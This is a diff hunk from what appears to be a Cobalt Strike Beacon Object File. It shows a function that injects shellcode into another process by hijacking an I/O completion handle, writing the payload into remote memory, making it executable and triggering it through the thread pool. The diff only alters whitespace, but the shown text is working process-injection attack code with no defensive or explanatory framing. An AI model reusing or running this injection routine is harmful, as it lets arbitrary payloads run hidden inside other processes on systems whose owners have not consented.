@@ -50,14 +50,13 @@ void Inject4(DWORD dwTargetProcessId, CHAR* shellcode, SIZE_T shellcodeSize) {
 
         if (hTarget) {
                 HijackIoCompletionHandle(hTarget, IO_COMPLETION_ALL_ACCESS);
-                
+
                 PVOID pShellcodeAddress = KERNEL32$VirtualAllocEx(hTarget, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                 NtWriteVirtualMemory(hTarget, pShellcodeAddress, shellcode, shellcodeSize, NULL);
                 KERNEL32$VirtualProtectEx(hTarget, pShellcodeAddress, shellcodeSize, PAGE_EXECUTE_READ, &dwOldProtect);
-                
+
                 RemoteTpIoInsertionSetupExecution(hTarget, pShellcodeAddress);
         } else {
                 BeaconPrintf(CALLBACK_OUTPUT, "PID %d inaccessible", dwTargetProcessId);
         }
-
 }
